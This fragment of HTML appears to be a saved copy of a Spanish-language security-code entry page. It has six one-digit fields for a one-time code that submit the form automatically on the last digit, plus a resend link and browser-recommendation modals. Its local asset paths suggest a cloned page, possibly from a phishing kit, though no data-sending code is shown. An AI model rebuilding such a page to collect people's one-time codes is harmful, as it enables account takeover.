        ...
        <main id="contenedorPrincipal" class="ds-contenedor-principal">
            <section class="ds-contenedor ds-contenedor--publico ds-contenedor__scroll">
                ...
                <section class="ds-contenido-principal">
                    ...
                    <h4 style="font-family:Trebuchet MS,sans-serif;" class="ds-titulo-primario ds-titulo-primario--color-primario">Código de seguridad</h4>
...
<div class="ds-grupo-caja" bis_skin_checked="1">

                <input type="tel" maxlength="1" style=" border: 2px solid #DDDDDD!important;
    ...
    -moz-transition: all 0.4s;
    transition: all 0.4s;
    justify-content: center;" id="desafio2" autocomplete="off" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num3.focus()" name="num2" required="">
    ...
    -moz-transition: all 0.4s;
    transition: all 0.4s;
    justify-content: center;" id="desafio3" autocomplete="off" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num4.focus()" name="num3" required="">
    ...
    -moz-transition: all 0.4s;
    transition: all 0.4s;
    justify-content: center;" id="desafio4" autocomplete="off" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num5.focus()" name="num4" required="">
    ...
    -moz-transition: all 0.4s;
    transition: all 0.4s;
    justify-content: center;" id="desafio5" autocomplete="off" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num6.focus()" name="num5" required="">
    ...
    -moz-transition: all 0.4s;
    transition: all 0.4s;
    justify-content: center;" id="desafio6" autocomplete="off" onkeyup="if (this.value.length == this.getAttribute('maxlength')) form1.submit();" name="num6" required="">
            ...
            <span style="font-size: 16px;color:#489E42;font-weight:inherit;" class="ds-subtitulo"><u>Reenviar código</u></span>
                ...
                <div id="divBotonInicioSesion" class="ds-div__boton--mostrar" bis_skin_checked="1">
                    <input style="background-color:#147A06;font-family:Trebuchet MS,sans-serif;" type="submit" value="Continuar" id="btnEnrolamiento" class="ds-control ds-control-boton ds-control-boton--secundario">
        ...
        <div class="ds-modal-content ds-modal__informacion" bis_skin_checked="1">
            <div id="contenedorCabeceraModal" class="ds-modal-header ds-cabecera-modal" bis_skin_checked="1">
                <div id="contenedorImagenModal" class="ds-imagen-modal" bis_skin_checked="1">
                    <img class="ds-modal__imagen--origami-superior" src="index_files/origami_superior.png" alt="origami superior">
                    <img class="ds-img__cerrar-blanco" src="index_files/icono_cerrar-blanco.svg" onclick="fnCerrarmodalNavegadoresSugeridos()" alt="icono cerrar">
                </div>
            </div>
            <div id="cuerpoModal" class="ds-modal-body ds-cuerpo-modal ds-cuerpo-modal__centro" bis_skin_checked="1">
                <div class="col-lg-12" bis_skin_checked="1">
                    <div class="col-lg-3 ds-imagen-modal--derecha" bis_skin_checked="1">
                        <img src="index_files/icono_campana.svg" alt="">
                    </div>
            ...
            <div id="modalPie" class="ds-modal-pie ds-modal-pie-centro" bis_skin_checked="1">
                <div class="ds-margen-inferior-30" bis_skin_checked="1">
                    <img src="index_files/navegador_google-chrome.svg" alt="Navegador Google Chrome">
                    <img src="index_files/navegador_microsoft-edge.svg" alt="Navegador Microsoft Edge">
                    <img src="index_files/navegador_mozilla-firefox.svg" alt="Navegador Mozilla Firefox">
        ...
        <div class="ds-modal-content" bis_skin_checked="1">
            <div id="cuerpoModal" class="ds-modal-body ds-cuerpo-modal" bis_skin_checked="1">
                <div class="col-lg-12 ds-margen-superior-30 ds-margen-inferior-30" bis_skin_checked="1">
                    <img class="ds-img__cerrar--negro" src="index_files/icono_cerrar-negro.svg" onclick="fnCerrarmodalNavegadorCambia()" alt="icono cerrar">
                    <div class="col-lg-1" bis_skin_checked="1">
                        <img src="index_files/icono_pagina-web.svg" alt="Pagina web">
                    </div>
